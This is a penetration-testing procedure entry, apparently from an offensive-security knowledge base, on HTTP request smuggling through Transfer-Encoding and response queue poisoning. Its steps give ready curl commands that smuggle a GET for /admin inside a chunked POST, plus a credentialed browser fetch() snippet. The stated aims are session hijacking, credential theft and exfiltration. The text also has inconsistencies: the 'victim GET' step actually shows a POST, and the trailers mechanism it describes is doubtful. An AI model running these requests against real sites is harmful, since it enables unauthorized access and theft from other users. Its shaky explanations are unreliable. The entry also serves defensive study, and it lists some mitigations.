---
id: c1c2acc7-00d3-4119-8684-92ac29846fab
name: HTTP-Request-Smuggling-via-TE-and-Response-Queue-Poisoning
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:32.067584+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - '[[tags/Client-side desync]]'
  - '[[tags/Request Smuggling]]'
  - http-smuggling
  - te-poisoning
commands:
  - '[[commands/curl-te-chunked-smuggle]]'
  - '[[commands/curl-followup-te-poison]]'
platforms:
  - Web
tools: []
validated: true
---

# HTTP-Request-Smuggling-via-TE-and-Response-Queue-Poisoning

## Summary

This procedure demonstrates HTTP Request Smuggling using Transfer-Encoding (TE) headers and response queue poisoning to cause client-side desynchronization between the front-end and back-end servers. By crafting requests that exploit differences in how servers parse chunked transfers, an attacker can inject malicious requests, bypass security controls, and enable attacks such as session hijacking or unauthorized data access.

## Description

HTTP Request Smuggling exploits inconsistencies in how HTTP proxies or load balancers (front-end) and application servers (back-end) interpret HTTP requests, particularly with Transfer-Encoding: chunked. In this variant, an attacker sends a POST request with a zero-length chunk followed by a smuggled GET request, queuing it in the back-end's response buffer. A follow-up request with TE: trailers poisons the queue, causing the front-end to misinterpret responses and deliver poisoned content to the victim client. This technique is effective against vulnerable configurations in servers like older Apache or IIS setups behind misconfigured proxies. It requires knowledge of the target's HTTP/1.1 implementation and is commonly used in web application penetration testing to demonstrate desync vulnerabilities leading to cache poisoning or credential theft.

## Requirements

1. Network access to the target web application (e.g., via direct connection or proxy).
2. Tools capable of sending custom HTTP requests with precise header control, such as curl or a browser with developer tools.
3. Identification of a vulnerable server stack (e.g., front-end proxy that ignores TE: chunked while back-end processes it).
4. Valid session or no authentication barrier to initiate requests (low-privilege access suffices).

## Defense

- Configure front-end and back-end servers to use consistent HTTP parsing rules, such as normalizing TE headers and rejecting ambiguous requests.
- Implement strict request validation to block malformed chunked transfers or unexpected TE values.
- Use HTTP/2 or later protocols where smuggling is harder due to multiplexing.
- Monitor for anomalous request patterns, like multiple chunked POSTs in sequence, using WAFs like ModSecurity.

## Objectives

1. Cause desynchronization between client, front-end, and back-end to smuggle unauthorized requests.
2. Poison the response queue to deliver manipulated content to victims.
3. Enable follow-on attacks like session fixation, cache poisoning, or data exfiltration.
4. Verify vulnerability by observing mismatched responses or injected content.

## Instructions

### Step 1: Send Initial Smuggling Request

**Context**: Craft and send a POST request using Transfer-Encoding: chunked with a zero-length chunk, smuggling a GET request inside. This queues the GET on the back-end while the front-end sees it as part of the POST body. Use this to test if the server is vulnerable to TE-based smuggling.

**Command** ([[commands/curl-te-chunked-smuggle]]):
```bash
curl -X POST -H "Transfer-Encoding: chunked" -H "Connection: keep-alive" --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: $_TARGET_HOST\r\n\r\n' http://$_TARGET_HOST/
```

> This command sends a chunked POST that ends prematurely (chunk size 0), followed by a smuggled GET request for a protected endpoint like /admin. The back-end queues the GET, waiting for more chunks. Replace $_TARGET_HOST with the target domain (e.g., example.com). Expected output includes a 200 OK from the smuggled GET if successful, or a partial response indicating queuing.

### Step 2: Send Follow-up Poisoning Request

**Context**: Immediately send a second POST with a chunk including TE: trailers and Connection: close. This tricks the back-end into flushing the queued GET with injected headers, while closing the connection to prevent the front-end from receiving the full response, poisoning the queue for subsequent legitimate requests.

**Command** ([[commands/curl-followup-te-poison]]):
```bash
curl -X POST -H "Transfer-Encoding: chunked" -H "TE: trailers" -H "Connection: close" --data-binary $'1\r\nTE: trailers\r\n\r\n0\r\n\r\n' http://$_TARGET_HOST/
```

> This command completes the poisoning by sending a small chunk with TE: trailers, signaling the end of the initial request to the back-end, which then processes and responds to the smuggled GET. The Connection: close forces the front-end to discard the response, leaving poisoned data in the queue. Expected output is a connection closure without full response; verify by sending a benign GET from another client/session, which should receive the poisoned /admin response.

### Step 3: Verify Desynchronization and Poisoning

**Context**: From a separate client or session (e.g., victim's browser), send a normal GET request to the same endpoint. If successful, the response will contain the smuggled content, confirming client-side desync and queue poisoning.

**Code** ([[codes/JavaScript-Fetch-for-HTTP-Request-Smuggling]]):
```javascript
fetch('https://www.example.com/', {method: 'POST', body: "GET / HTTP/1.1\r\nHost: www.example.com", mode: 'no-cors', credentials: 'include'} )
```

> Use this JavaScript snippet in a browser console or script to simulate a victim's request post-poisoning. It sends a POST with a smuggled GET in the body under no-cors mode to mimic cross-origin behavior. Expected output: The response body contains the poisoned /admin page or injected headers, indicating successful desync. Monitor network tab for anomalous headers or content.
